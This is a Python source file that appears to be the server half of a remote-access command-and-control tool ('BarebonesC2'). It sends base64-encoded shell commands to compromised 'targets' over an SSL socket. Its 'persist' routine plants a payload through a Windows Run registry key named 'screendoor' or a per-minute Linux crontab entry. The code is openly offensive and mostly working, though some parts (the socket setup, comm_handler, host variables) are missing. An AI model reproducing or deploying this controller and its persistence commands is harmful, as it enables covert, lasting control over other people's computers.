import socket
import threading
import time
import random
import string
import os
import os.path
import shutil
import base64
import subprocess
from datetime import datetime
from prettytable import PrettyTable
import ssl

def init_server_socket():
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    # Bind and listen omitted for brevity...
    
    # SSL Context
    context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
    context.load_cert_chain(certfile='path/to/cert.pem', keyfile='path/to/key.pem')  # Adjust the path to your certificate files

    secure_sock = context.wrap_socket(sock, server_side=True)
    return secure_sock

def banner():
    print('╔╗ ┌─┐┬─┐┌─┐┌┐ ┌─┐┌┐┌┌─┐┌─┐ ╔═╗2')
    print('╠╩╗├─┤├┬┘├┤ ├┴┐│ ││││├┤ └─┐ ║ by the Mayor')
    print('╚═╝┴ ┴┴└─└─┘└─┘└─┘┘└┘└─┘└─┘ ╚═╝')

def comm_in(targ_id):
    print(f'[+] Awaiting response...')
    response = targ_id.recv(4096).decode()
    response = base64.b64decode(response)
    response = response.decode().strip()
    return response

def comm_out(targ_id, message):
    message = str(message)
    message = base64.b64encode(bytes(message, encoding='utf8'))
    targ_id.send(message)

def target_comm(targ_id, targets, num):
    while True:
        message = input(f'{targets[num][3]}/{targets[num][1]}#> ')
        if len(message) == 0:
            continue
        if message == 'help':
            pass
        else:
            comm_out(targ_id, message)
        if message == 'exit':
            message = base64.b64encode(message.encode())
            targ_id.send(message)
            targ_id.close()
            targets[num][7] = 'Dead'
            break
        if message == 'background':
            break
        if message == 'persist':
            payload_name = input('[+] Enter the name of the payload to add to persistence: ')
            if targets[num][6] == 1:
                persist_command_1 = f'cmd.exe /c copy {payload_name} C:\\Users\\Public'
                persist_command_1 = base64.b64encode(persist_command_1.encode())
                targ_id.send(persist_command_1)
                persist_command_2 = f'reg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run -v screendoor /t REG_SZ /d C:\\Users\\Public\\{payload_name}'
                persist_command_2 = base64.b64encode(persist_command_2.encode())
                targ_id.send(persist_command_2)
                print('[+] Run this command to clean up the registry: \nreg delete HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v screendoor /f')
            if targets[num][6] == 2:
                persist_command = f'echo "*/1 * * * * python3 /home/{targets[num][3]}/{payload_name}" | crontab -'
                persist_command = base64.b64encode(persist_command.encode())
                targ_id.send(persist_command)
                print('[+] Run this command to clean up the crontab: \n crontab -r')
            print('[+] Persistence technique completed.')
        else:
            response = comm_in(targ_id)
            if response == 'exit':
                print('[-] The client has terminated the session.')
                targ_id.close()
                break
            print(response)

def listener_handler():
    sock.bind((host_ip, int(host_port)))
    print('[+] Awaiting connection from client...')
    sock.listen()
    t1 = threading.Thread(target=comm_handler)
    t1.start()